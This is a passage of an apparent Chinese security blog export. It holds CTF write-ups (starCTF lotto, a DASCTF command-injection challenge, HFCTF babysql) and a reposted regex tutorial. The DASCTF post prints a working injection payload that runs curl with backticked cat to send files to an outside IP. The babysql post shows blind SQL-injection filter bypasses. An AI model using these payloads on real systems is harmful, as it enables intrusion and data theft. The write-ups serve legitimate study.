WEB题lotto复现","url":"/2022/04/17/starCTF-lotto/","content":"题目要你去玩这个乐透，虽然没接触过，但不影响\n进去先要写脚本爆破一下这个MD5\n\nimport hashlib\nfrom string import ascii_letters, digits\nfrom itertools import product\ntable = ascii_letters + digits\ndef crash():\n    hash = \"xxxxxx\"\n    #product()函数可用于生成笛卡尔积（就是排列组合）,参数repeat为组几位\n    for i in product(table, repeat=5):\n        t = hashlib.md5(('').join(i).encode()).hexdigest()\n        #print(t[:6])\n        if t[:6] == hash:\n            print(''.join(i))\n            break\nif __name__ == '__main__':\n    crash()\n\n\n\n题目还给了带Docker的源码，可以自己本地搭建环境测试。重点代码：\napp目录下的\n\nfrom flask import Flask,render_template, request\nimport os\n\napp = Flask(__name__, static_url_path='')\n\ndef safe_check(s):\n    if 'LD' in s or 'HTTP' in s or 'BASH' in s or 'ENV' in s or 'PROXY' in s or 'PS' in s: \n        return False\n    return True\n\n@app.route(\"/\", methods=['GET', 'POST'])\ndef index():\n    return render_template('index.html')\n\n@app.route(\"/lotto\", methods=['GET', 'POST'])\ndef lotto():\n    message = ''\n\n    if request.method == 'GET':\n        return render_template('lotto.html')\n\n    elif request.method == 'POST':\n        flag = os.getenv('flag')\n        lotto_key = request.form.get('lotto_key') or ''\n        lotto_value = request.form.get('lotto_value') or ''\n        try:\n            lotto_key = lotto_key.upper()\n        except Exception as e:\n            print(e)\n            message = 'Lotto Error!'\n            return render_template('lotto.html', message=message)\n        \n        if safe_check(lotto_key):\n            os.environ[lotto_key] = lotto_value\n            try:\n                os.system('wget --content-disposition -N lotto')\n\n                if os.path.exists(\"/app/lotto_result.txt\"):\n                    lotto_result = open(\"/app/lotto_result.txt\", 'rb').read()\n                else:\n                    lotto_result = 'result'\n                if os.path.exists(\"/app/guess/forecast.txt\"):\n                    forecast = open(\"/app/guess/forecast.txt\", 'rb').read()\n                else:\n                    forecast = 'forecast'\n\n                if forecast == lotto_result:\n                    return flag\n                else:\n                    message = 'Sorry forecast fxxxxxxxxxxxx!' + result\n                    return render_template('lotto.html', message=message)\n            except Exception as e:\n                message = 'Lotto Error!'\n                return render_template('lotto.html', message=message)\n                \n        else:\n            message = 'NO NO NO, JUST LOTTO!'\n            return render_template('lotto.html', message=message)\n            \n@app.route(\"/forecast\", methods=['GET', 'POST'])\ndef forecast():\n\n    message = ''\n    if request.method == 'GET':\n        return render_template('forecast.html')\n    elif request.method == 'POST':\n        if 'file' not in request.files:\n            message = 'Where is your forecast?'\n            \n        file = request.files['file']\n        file.save('/app/guess/forecast.txt')\n        message = \"OK, I get your forecast. Let's Lotto!\"\n        return render_template('forecast.html', message=message)\n\n@app.route(\"/result\", methods=['GET'])\ndef result():\n\n    if os.path.exists(\"/app/lotto_result.txt\"):\n        lotto_result = open(\"/app/lotto_result.txt\", 'rb').read().decode()\n    else:\n        lotto_result = ''\n    \n    return render_template('result.html', message=lotto_result)\n        \n\nif __name__ == \"__main__\":\n    app.run(debug=True,host='0.0.0.0', port=8080)\n\n\n\n\nlotto目录下的\nfrom flask import Flask, make_response\nimport secrets\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    lotto = []\n    for i in range(1, 20):\n        n = str(secrets.randbelow(40))\n        lotto.append(n)\n    \n    r = '\\n'.join(lotto)\n    response = make_response(r)\n    response.headers['Content-Type'] = 'text/plain'\n    response.headers['Content-Disposition'] = 'attachment; filename=lotto_result.txt'\n    return response\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host='0.0.0.0', port=80)\n\n\n乐透这个游戏是要我们去猜彩票的号码，要求我们去上传一个forecast.txt的文件，文件里是我们预测的数字，同时其使用 wget 这个命令去下载生成随机数的文件 lotoo_result.txt（20个0-40的随机数）。题目说我们可以作弊，就是可以上传key,vale来更改环境变量\n\n可以改变环境变量，那么可以让 PATH 这个环境变量为空，就会导致当前这个 os 的shell的 wget 失效（测试过也不会报错），从而使生成的随机数不会再改变，再去上传这个随机数就可以了，说到这个那就讲讲这个Linux环境变量\n系统中有环境变量 PATH ,看看这个PATH是什么\n\n是几个含有各种系统命令的路径，每次在bash中输入各种命令就会在这些路径去寻找\n现在使 PATH= 看看\nls命令直接没了（这里export可以省略）echo命令可以正常使用\n\necho一下，PATH为空了，看看wget命令也没了\n\n当然，这些改变都是临时的，退出终端在进去一切正常，同一设备的不同的终端也不会相互影响\n好了，回到正题，在本地用docker搭建下环境\n打开docker,直接在vscode的终端输入 docker-compose up或 docker-compose up -d （ -d 代表在后台运行）\n\n随便输点拿到随机数\n\n在KEY中输入 PATH 配置环境变量为空使wget失效\n\n这下 随机数是个定值了\n上传文件使用 bp 抓包（这里由于是在本地搭建的环境，不好设置代理让 bp抓包，就直接用bp自带的浏览器了）其实bp自带的浏览器还是可以的\n这里注意要将 \\r 给去掉，应为题目给的随机数之间是以\\n分割的，而两者之间又是比较的它们的 二进制值 是否相同，所以要完全一致才行，改完保存好发送\n\n回到lotto页面点击lotto按钮就可以拿到flag了\n\n这里的方法应该是非预期解，后面又给了个revenge版，是预期解，这个lotto2 以后再说………….\n","categories":["CTF-WP"],"tags":["python","Linux环境变量","wget","flask"]},{"title":"正则表达式学习","url":"/2022/04/09/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/","content":"重要声明，本文转载自 : https://github.com/ziishaned/learn-regex\n\n什么是正则表达式？\n\n正则表达式是一组由字母和符号组成的特殊文本，它可以用来从文本中找出满足你想要的格式的句子。\n\n一个正则表达式是一种从左到右匹配主体字符串的模式。“Regular expression”这个词比较拗口，我们常使用缩写的术语“regex”或“regexp”。正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等。\n想象你正在写一个应用，然后你想设定一个用户命名的规则，让用户名包含字符、数字、下划线和连字符，以及限制字符的个数，好让名字看起来没那么丑。我们使用以下正则表达式来验证一个用户名：\n\n以上的正则表达式可以接受 john_doe、jo-hn_doe、john12_as。但不匹配Jo，因为它包含了大写的字母而且太短了。\n1. 基本匹配正则表达式其实就是在执行搜索时的格式，它由一些字母和数字组合而成。例如：一个正则表达式 the，它表示一个规则：由字母t开始，接着是h，再接着是e。\n“the” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n正则表达式123匹配字符串123。它逐个字符的与输入的正则表达式做比较。\n正则表达式是大小写敏感的，所以The不会匹配the。\n“The” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n2. 元字符正则表达式主要依赖于元字符。元字符不代表他们本身的字面意思，他们都有特殊的含义。一些元字符写在方括号中的时候有一些特殊的意思。以下是一些元字符的介绍：\n\n\n\n元字符\n描述\n\n\n\n.\n句点匹配任意单个字符除了换行符。\n\n\n[ ]\n字符种类。匹配方括号内的任意字符。\n\n\n[^ ]\n否定的字符种类。匹配除了方括号里的任意字符\n\n\n*\n匹配&gt;&#x3D;0个重复的在*号之前的字符。\n\n\n+\n匹配&gt;&#x3D;1个重复的+号前的字符。\n\n\n?\n标记?之前的字符为可选.\n\n\n{n,m}\n匹配num个大括号之前的字符或字符集 (n &lt;&#x3D; num &lt;&#x3D; m).\n\n\n(xyz)\n字符集，匹配与 xyz 完全相等的字符串.\n\n\n&amp;#124;\n或运算符，匹配符号前或后的字符.\n\n\n&amp;#92;\n转义字符,用于匹配一些保留的字符 [ ] ( ) &#123; &#125; . * + ? ^ $ \\ &#124;\n\n\n^\n从开始行开始匹配.\n\n\n$\n从末端开始匹配.\n\n\n2.1 点运算符 ..是元字符中最简单的例子。.匹配任意单个字符，但不匹配换行符。例如，表达式.ar匹配一个任意字符后面跟着是a和r的字符串。\n“.ar” &#x3D;&gt; The car parked in the garage.\n在线练习\n2.2 字符集字符集也叫做字符类。方括号用来指定一个字符集。在方括号中使用连字符来指定字符集的范围。在方括号中的字符集不关心顺序。例如，表达式[Tt]he 匹配 the 和 The。\n“[Tt]he” &#x3D;&gt; The car parked in the garage.\n在线练习\n方括号的句点就表示句点。表达式 ar[.] 匹配 ar.字符串\n“ar[.]” &#x3D;&gt; A garage is a good place to park a car.\n在线练习\n2.2.1 否定字符集一般来说 ^ 表示一个字符串的开头，但它用在一个方括号的开头的时候，它表示这个字符集是否定的。例如，表达式[^c]ar 匹配一个后面跟着ar的除了c的任意字符。\n“[^c]ar” &#x3D;&gt; The car parked in the garage.\n在线练习\n2.3 重复次数后面跟着元字符 +，* or ? 的，用来指定匹配子模式的次数。这些元字符在不同的情况下有着不同的意思。\n2.3.1 * 号*号匹配 在*之前的字符出现大于等于0次。例如，表达式 a* 匹配0或更多个以a开头的字符。表达式[a-z]* 匹配一个行中所有以小写字母开头的字符串。\n“[a-z]*” &#x3D;&gt; The car parked in the garage #21.\n在线练习\n*字符和.字符搭配可以匹配所有的字符.*。*和表示匹配空格的符号\\s连起来用，如表达式\\s*cat\\s*匹配0或更多个空格开头和0或更多个空格结尾的cat字符串。\n“\\scat\\s“ &#x3D;&gt; The fat cat sat on the concatenation.\n在线练习\n2.3.2 + 号+号匹配+号之前的字符出现 &gt;&#x3D;1 次。例如表达式c.+t 匹配以首字母c开头以t结尾，中间跟着至少一个字符的字符串。\n“c.+t” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n2.3.3 ? 号在正则表达式中元字符 ? 标记在符号前面的字符为可选，即出现 0 或 1 次。例如，表达式 [T]?he 匹配字符串 he 和 The。\n“[T]he” &#x3D;&gt; The car is parked in the garage.\n在线练习\n“[T]?he” &#x3D;&gt; The car is parked in the garage.\n在线练习\n2.4 &#123;&#125; 号在正则表达式中 &#123;&#125; 是一个量词，常用来限定一个或一组字符可以重复出现的次数。例如， 表达式 [0-9]&#123;2,3&#125; 匹配最少 2 位最多 3 位 0~9 的数字。\n“[0-9]{2,3}” &#x3D;&gt; The number was 9.9997 but we rounded it off to 10.0.\n在线练习\n我们可以省略第二个参数。例如，[0-9]&#123;2,&#125; 匹配至少两位 0~9 的数字。\n“[0-9]{2,}” &#x3D;&gt; The number was 9.9997 but we rounded it off to 10.0.\n在线练习\n如果逗号也省略掉则表示重复固定的次数。例如，[0-9]&#123;3&#125; 匹配3位数字\n“[0-9]{3}” &#x3D;&gt; The number was 9.9997 but we rounded it off to 10.0.\n在线练习\n2.5 (...) 特征标群特征标群是一组写在 (...) 中的子模式。(...) 中包含的内容将会被看成一个整体，和数学中小括号（ ）的作用相同。例如, 表达式 (ab)* 匹配连续出现 0 或更多个 ab。如果没有使用 (...) ，那么表达式 ab* 将匹配连续出现 0 或更多个 b 。再比如之前说的 &#123;&#125; 是用来表示前面一个字符出现指定次数。但如果在 &#123;&#125; 前加上特征标群 (...) 则表示整个标群内的字符重复 N 次。\n我们还可以在 () 中用或字符 | 表示或。例如，(c|g|p)ar 匹配 car 或 gar 或 par.\n“(c|g|p)ar” &#x3D;&gt; The car is parked in the garage.\n在线练习\n2.6 | 或运算符或运算符就表示或，用作判断条件。\n例如 (T|t)he|car 匹配 (T|t)he 或 car。\n“(T|t)he|car” &#x3D;&gt; The car is parked in the garage.\n在线练习\n2.7 转码特殊字符反斜线 \\ 在表达式中用于转码紧跟其后的字符。用于指定 &#123; &#125; [ ] / \\ + * . $ ^ | ? 这些特殊字符。如果想要匹配这些特殊字符则要在其前面加上反斜线 \\。\n例如 . 是用来匹配除换行符外的所有字符的。如果想要匹配句子中的 . 则要写成 \\. 以下这个例子 \\.?是选择性匹配.\n“(f|c|m)at\\.?” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n2.8 锚点在正则表达式中，想要匹配指定开头或结尾的字符串就要使用到锚点。^ 指定开头，$ 指定结尾。\n2.8.1 ^ 号^ 用来检查匹配的字符串是否在所匹配字符串的开头。\n例如，在 abc 中使用表达式 ^a 会得到结果 a。但如果使用 ^b 将匹配不到任何结果。因为在字符串 abc 中并不是以 b 开头。\n例如，^(T|t)he 匹配以 The 或 the 开头的字符串。\n“(T|t)he” &#x3D;&gt; The car is parked in the garage.\n在线练习\n“^(T|t)he” &#x3D;&gt; The car is parked in the garage.\n在线练习\n2.8.2 $ 号同理于 ^ 号，$ 号用来匹配字符是否是最后一个。\n例如，(at\\.)$ 匹配以 at. 结尾的字符串。\n“(at\\.)” &#x3D;&gt; The fat cat. sat. on the mat.\n在线练习\n“(at\\.)$” &#x3D;&gt; The fat cat. sat. on the mat.\n在线练习\n3. 简写字符集正则表达式提供一些常用的字符集简写。如下:\n\n\n\n简写\n描述\n\n\n\n.\n除换行符外的所有字符\n\n\n\\w\n匹配所有字母数字，等同于 [a-zA-Z0-9_]\n\n\n\\W\n匹配所有非字母数字，即符号，等同于： [^\\w]\n\n\n\\d\n匹配数字： [0-9]\n\n\n\\D\n匹配非数字： [^\\d]\n\n\n\\s\n匹配所有空格字符，等同于： [\\t\\n\\f\\r\\p&#123;Z&#125;]\n\n\n\\S\n匹配所有非空格字符： [^\\s]\n\n\n\\f\n匹配一个换页符\n\n\n\\n\n匹配一个换行符\n\n\n\\r\n匹配一个回车符\n\n\n\\t\n匹配一个制表符\n\n\n\\v\n匹配一个垂直制表符\n\n\n\\p\n匹配 CR&#x2F;LF（等同于 \\r\\n），用来匹配 DOS 行终止符\n\n\n4. 零宽度断言（前后预查）先行断言和后发断言（合称 lookaround）都属于非捕获组（用于匹配模式，但不包括在匹配列表中）。当我们需要一个模式的前面或后面有另一个特定的模式时，就可以使用它们。\n例如，我们希望从下面的输入字符串 $4.44 和 $10.88 中获得所有以 $ 字符开头的数字，我们将使用以下的正则表达式 (?&lt;=\\$)[0-9\\.]*。意思是：获取所有包含 . 并且前面是 $ 的数字。\n零宽度断言如下：\n\n\n\n符号\n描述\n\n\n\n?&#x3D;\n正先行断言-存在\n\n\n?!\n负先行断言-排除\n\n\n?&lt;&#x3D;\n正后发断言-存在\n\n\n?&lt;!\n负后发断言-排除\n\n\n4.1 ?=... 正先行断言?=... 正先行断言，表示第一部分表达式之后必须跟着 ?=...定义的表达式。\n返回结果只包含满足匹配条件的第一部分表达式。定义一个正先行断言要使用 ()。在括号内部使用一个问号和等号： (?=...)。\n正先行断言的内容写在括号中的等号后面。例如，表达式 (T|t)he(?=\\sfat) 匹配 The 和 the，在括号中我们又定义了正先行断言 (?=\\sfat) ，即 The 和 the 后面紧跟着 (空格)fat。\n“(T|t)he(?&#x3D;\\sfat)” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n4.2 ?!... 负先行断言负先行断言 ?! 用于筛选所有匹配结果，筛选条件为 其后不跟随着断言中定义的格式。正先行断言  定义和 负先行断言 一样，区别就是 = 替换成 ! 也就是 (?!...)。\n表达式 (T|t)he(?!\\sfat) 匹配 The 和 the，且其后不跟着 (空格)fat。\n“(T|t)he(?!\\sfat)” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n4.3 ?&lt;= ... 正后发断言正后发断言 记作(?&lt;=...) 用于筛选所有匹配结果，筛选条件为 其前跟随着断言中定义的格式。例如，表达式 (?&lt;=(T|t)he\\s)(fat|mat) 匹配 fat 和 mat，且其前跟着 The 或 the。\n“(?&lt;&#x3D;(T|t)he\\s)(fat|mat)” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n4.4 ?&lt;!... 负后发断言负后发断言 记作 (?&lt;!...) 用于筛选所有匹配结果，筛选条件为 其前不跟随着断言中定义的格式。例如，表达式 (?&lt;!(T|t)he\\s)(cat) 匹配 cat，且其前不跟着 The 或 the。\n“(?&lt;!(T|t)he\\s)(cat)” &#x3D;&gt; The cat sat on cat.\n在线练习\n5. 标志标志也叫模式修正符，因为它可以用来修改表达式的搜索结果。这些标志可以任意的组合使用，它也是整个正则表达式的一部分。\n\n\n\n标志\n描述\n\n\n\ni\n忽略大小写。\n\n\ng\n全局搜索。\n\n\nm\n多行修饰符：锚点元字符 ^ $ 工作范围在每行的起始。\n\n\n5.1 忽略大小写 (Case Insensitive)修饰语 i 用于忽略大小写。例如，表达式 /The/gi 表示在全局搜索 The，在后面的 i 将其条件修改为忽略大小写，则变成搜索 the 和 The，g 表示全局搜索。\n“The” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n“&#x2F;The&#x2F;gi” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n5.2 全局搜索 (Global search)修饰符 g 常用于执行一个全局搜索匹配，即（不仅仅返回第一个匹配的，而是返回全部）。例如，表达式 /.(at)/g 表示搜索 任意字符（除了换行）+ at，并返回全部结果。\n“&#x2F;.(at)&#x2F;“ &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n“&#x2F;.(at)&#x2F;g” &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n5.3 多行修饰符 (Multiline)多行修饰符 m 常用于执行一个多行匹配。\n像之前介绍的 (^,$) 用于检查格式是否是在待检测字符串的开头或结尾。但我们如果想要它在每行的开头和结尾生效，我们需要用到多行修饰符 m。\n例如，表达式 /at(.)?$/gm 表示小写字符 a 后跟小写字符 t ，末尾可选除换行符外任意字符。根据 m 修饰符，现在表达式匹配每行的结尾。\n“&#x2F;.at(.)?$&#x2F;“ &#x3D;&gt; The fat                cat sat                on the mat.\n在线练习\n“&#x2F;.at(.)?$&#x2F;gm” &#x3D;&gt; The fat                  cat sat                  on the mat.\n在线练习\n6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 ? 将贪婪匹配模式转化为惰性匹配模式。\n“&#x2F;(.*at)&#x2F;“ &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n“&#x2F;(.*?at)&#x2F;“ &#x3D;&gt; The fat cat sat on the mat.\n在线练习\n贡献\n报告问题\n开放合并请求\n传播此文档\n直接和我联系 &#x7a;&#x69;&#x69;&#x73;&#104;&#x61;&#110;&#x65;&#100;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d; 或 \n\n许可证MIT &amp;copy; Zeeshan Ahmad\nMIT License\nCopyright (c) 2019 Zeeshan Ahmad\nPermission is hereby granted, free of charge, to any person obtaining a copyof this software and associated documentation files (the “Software”), to dealin the Software without restriction, including without limitation the rightsto use, copy, modify, merge, publish, distribute, sublicense, and&#x2F;or sellcopies of the Software, and to permit persons to whom the Software isfurnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in allcopies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS ORIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHERLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THESOFTWARE.\n","categories":["web安全基础"],"tags":["regex"]},{"title":"2022DASCTF一道命令注入题","url":"/2022/03/28/2022DASCTF%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%A2%98/","content":"周末第一次组队和大佬们打比赛，web题只做了一道签到题。之后从11点开始坐牢。后面两道web题很难，都是知识盲区。\n题目给了源码，是个用flask框架写的一个计算器程序，刚开始以为是SSTI模板注入，后来发现不是。\n先看下源码\n#coding=utf-8\nfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\nimport random\nfrom urllib import parse\nimport os\nfrom werkzeug.utils import secure_filename\nimport time\n\napp=Flask(__name__)\n\ndef waf(s):\n    blacklist = ['import','(',')',' ','_','|',';','\"','&#123;','&#125;','&amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\n    flag = True\n    for no in blacklist:\n        if no.lower() in s.lower():\n            flag= False\n            print(no)\n            break\n    return flag\n    \n@app.route(\"/\")\ndef index():\n    \"欢迎来到SUctf2022\"\n    return render_template(\"index.html\")\n\n@app.route(\"/calc\",methods=['GET'])\ndef calc():\n    ip = request.remote_addr\n    num = request.values.get(\"num\")\n    log = \"echo &#123;0&#125; &#123;1&#125; &#123;2&#125;> ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num)\n    \n    if waf(num):\n        try:\n            data = eval(num)\n            os.system(log)\n        except:\n            pass\n        return str(data)\n    else:\n        return \"waf!!\"\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=5000)  \n \n\n\n\nwaf过滤了很多，基本不可能模板注入。但这里注意这几行代码\ndef calc():\n    ip = request.remote_addr\n    num = request.values.get(\"num\")\n    log = \"echo &#123;0&#125; &#123;1&#125; &#123;2&#125;> ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num)\n    \n    if waf(num):\n        try:\n            data = eval(num)\n            os.system(log)# 存在命令注入注入点\n        except:\n            pass\n        return str(data)\n    else:\n        return \"waf!!\"\n\n这里的 os.system(log)会执行log日志中的命令，将日志内容写入 ./tmp/log.txt中。\n\nps：注意这里的 &#x2F;tmp&#x2F;log.txt 并不能访问到，因为题中没有启用这个@app.route(&quot;/tmp/log.txt&quot;,methods=[&#39;GET&#39;])路由。(基础不牢的后果，要抽时间补一补flask框架的基础了)。\n\n所以这里从在命令注入，由于题目唯一能传参的地方是这个num，所以首先要绕过这个 eval(num)，不能让它报错。这里就要用python的特性了。\n举个栗子：\n\"print('test')\"\n'''print('test')'''\n\"\"\"print('test')\"\"\"\nstr0 = \"'''print('test')'''\"\nstr1 = '''print('test')'''\nprint(str1)\nprint(str0)\neval(str1)\neval(str0)\n\n运行结果如下:\n\npython中的引号包起来的字符串如果没有赋值给变量的话，它就是个注释。所以python中的多行注释写成\n'''\n这是一个\n注释\n'''\n\n由于num是字符串类型，那么可以构造 三个单引号的字符串 num=&#39;&#39;&#39;some code&#39;&#39;&#39;，这样 eval(num)实际运行的就是注释，不会报错，同时这里的几个单引号还为后面的命令注入提供了条件。\n那么可以构造payload（这里的ip是自己服务器的ip，注意把云服务器的端口打开）\n&#39;&#39;&#39;1&#39;&#96;curl\t-d\t\\&#96;cat\t*\\&#96;\t144.152.66.124:8866&#96;&#39;2&#39;&#39;&#39;\n\n#urlencode后为\n\n&#39;&#39;&#39;1&#39;%60curl%09-d%09%5C%60cat%09*%5C%60%09144.152.66.124%3A8866%60&#39;2&#39;&#39;&#39;\n\n这里由于空格被过滤了，用tab键代替(urlencode为%09)。\n简单解释一下这个payload\n三个单引号绕过eval()不用说了。拼接好log后调用os.system(log) ，就是执行\necho &#39;&#39;&#39;1&#39;&#96;curl\t-d\t\\&#96;cat\t*\\&#96;\t174.123.96.103:8866&#96;&#39;2&#39;&#39;&#39;&gt; .&#x2F;tmp&#x2F;log.txt\n\nshell中单引号两两匹配闭合成功，有反引号优先执行反引号的命令，利用curl 发包到自己的服务器从而拿到flag。\n打开服务器用 nc 监听自己开启的端口\n可以直接输入\n\n得到结果\n\n小结一下：这里其实挺考验个人的python和linux相关基础知识的。像curl和nc这样的工具以后要加强学习。\n","categories":["CTF-WP"],"tags":["python","命令注入"]},{"title":"HFCTF2022_babysql题目复现","url":"/2022/03/21/HFCTF-babysql%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/","content":"虎符的一道纯SQL注入题，原来准备自己再做一遍的，结果今天题目环境给关了，都怪周一课太多了 自己太懒。\n学到了一些奇特的绕过姿势。\n学到的东西case when 的错误注入case when用法官方文档中解释:\n\nCASE value WHEN [compare-value] THEN result [WHEN  [compare-value] THEN result …] [ELSE result] END CASE  WHEN [condition] THEN result [WHEN [condition] THEN  result …] [ELSE result] END\n\n(必须要有END结尾)\n在第一个方案的返回结果中，  value&#x3D;compare-value。而第二个方案的返回结果是第一种情况的真实结果。如果没有匹配的结果值，则返回结果为ELSE后的结果，如果没有ELSE  部分，则返回值为 NULL。\n例：\nmysql> SELECT CASE 1 WHEN 1 THEN 'one'\n\n    ->     WHEN 2 THEN 'two' ELSE 'more' END;\n\n        -> 'one'\n\nmysql> SELECT CASE WHEN 1>0 THEN 'true' ELSE 'false' END;\n\n        -> 'true'\n\nmysql> SELECT CASE BINARY 'B'\n\n    ->     WHEN 'a' THEN 1 WHEN 'b' THEN 2 END;\n\n        -> NULL\n\n\n一个CASE表达式的默认返回值类型是任何返回值的相容集合类型，但具体情况视其所在语境而定。如果用在字符串语境中，则返回结果味字符串。如果用在数字语境中，则返回结果为十进制值、实值或整数值。 \n简单来说就是对应CASE后的值匹配WHEN后的值，匹配成功则返回WHEN后THEN中的内容(注意:执行完THEN后即跳出，不会执行后面的THEN)。若都未匹配则返回ELSE的值，若还没有则返回NULL。\n在SQL注入中的使用通常当题目需要盲注但过滤了if()或括号等使得无法使用函数时，case when就派上用场了，对于基于报错的盲注又可以和溢出导致的报错相结合来使用。\n假如有这样一个表\nmysql> SELECT * FROM tb;\n+-------------------+------+\n| flag              | id   |\n+-------------------+------+\n| flag&#123;test_f1llag&#125; |    1 |\n+-------------------+------+\n1 row in set (0.00 sec)\n\nmysql> SELECT id FROM tb WHERE id=0 || CASE 1 WHEN flag REGEXP '^f' THEN 1 ELSE 1+~0 \t   END;\n+------+\n| id   |\n+------+\n|    1 |\n+------+\n1 row in set (0.00 sec)\n\n不使用if判断第一个flag第一个字符是否为’f’，如果是则返回 1（true），若不是则报出溢出错误\nmysql> SELECT id FROM tb WHERE id=0 || CASE 1 WHEN flag REGEXP '^a' THEN 1 ELSE 1+~0 \t\tEND;\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'\n\n（这里 ~ 为取反操作符，0 取反即为最大值，再加 1 溢出报错）\n这样可以使用基于报错的盲注来爆破flag。（未使用if()等函数）。case when 可以对应题目来进行修改达到目的。\n科学计数法和单(反)引号绕过当过滤了空格时可以使用科学计数法和单引号进行绕过\n还是上面的例子，可以构造这样的语句\nmysql> SELECT id FROM tb WHERE id=0 ||CASE+1e0WHEN`flag`REGEXP'^f'THEN+1e0ELSE~0e0+~0e0END;\n+------+\n| id   |\n+------+\n|    1 |\n+------+\n1 row in set (0.00 sec)\n\nmysql> SELECT id FROM tb WHERE id=0 ||CASE+1e0WHEN`flag`REGEXP'^a'THEN+1e0ELSE~0e0+~0e0END;\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0e0) + ~(0e0))'\n\n\n可以看到语句没有用到空格但可以执行，下面的(~0e0+~0e0)注意用算符优先级，~优先级最高，同时注意 1E0+~0是不会报溢出错误的，因为使用了科学计数法，范围增大了。\nmysql> select 1E0+~0;\n+-----------------------+\n| 1E0+~0                |\n+-----------------------+\n| 1.8446744073709552e19 |\n+-----------------------+\n1 row in set (0.00 sec)\n\nregexp，like的区分大小写的使用方法参考文档\nmysql> SELECT 'abc' LIKE 'ABC';\n        -> 1\nmysql> SELECT 'abc' LIKE _utf8mb4 'ABC' COLLATE utf8mb4_0900_as_cs;\n        -> 0\nmysql> SELECT 'abc' LIKE _utf8mb4 'ABC' COLLATE utf8mb4_bin;\n        -> 0\nmysql> SELECT 'abc' LIKE BINARY 'ABC';\n        -> 0\n\n还是利用上述实列\nmysql> SELECT id FROM tb WHERE id=0 ||CASE+1e0WHEN`flag`REGEXP+BINARY'^F'THEN+1e0ELSE~0e0+~0e0ENDD;\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0e0) + ~(0e0))'\n\nmysql> SELECT id FROM tb WHERE id=0 ||CASE+1e0WHEN`flag`REGEXP'^F'COLLATE'utf8mb4_bin'THEN+1e0ELSE~0e0+~0e0ENDD;\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0e0) + ~(0e0))'\n\n这里REGEXP和BINARY之间可以使用+分隔，和+1E0方法类似\nutf8mb4_bin可以用单引号包起来\n题目\n已经说了是纯SQL注入题了\n题目给了源码\nCREATE TABLE `auth` (\n  `id` int NOT NULL AUTO_INCREMENT,\n  `username` varchar(32) NOT NULL,\n  `password` varchar(32) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `auth_username_uindex` (`username`)\n) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;\n\nimport &#123; Injectable &#125; from '@nestjs/common';\nimport &#123; ConnectionProvider &#125; from '../database/connection.provider';\n\nexport class User &#123;\n  id: number;\n  username: string;\n&#125;\n\nfunction safe(str: string): string &#123;\n  const r = str\n    .replace(/[\\s,()#;*\\-]/g, '')\n    .replace(/^.*(?=union|binary).*$/gi, '')\n    .toString();\n  return r;\n&#125;\n//正则这里\\s表示所有空白字符比如空格，tab，%00等\n///^.*(?=union|binary).*$/gi表示匹配所有包含union和binary的字符串\n\n@Injectable()\nexport class AuthService &#123;\n  constructor(private connectionProvider: ConnectionProvider) &#123;&#125;\n\n  async validateUser(username: string, password: string): Promise&lt;User> | null &#123;\n    const sql = `SELECT * FROM auth WHERE username='$&#123;safe(username)&#125;' LIMIT 1`;\n    const [rows] = await this.connectionProvider.use((c) => c.query(sql));\n    const user = rows[0];\n    if (user &amp;&amp; user.password === password) &#123;\n      // eslint-disable-next-line @typescript-eslint/no-unused-vars\n      const &#123; password, ...result &#125; = user;\n      return result;\n    &#125;\n    return null;\n  &#125;\n&#125;\n\n过滤了非常多的东西，用到的绕过姿势就是上述方法。\n盲注 然后用 case when 的错误注入\n用科学计数法绕一半, 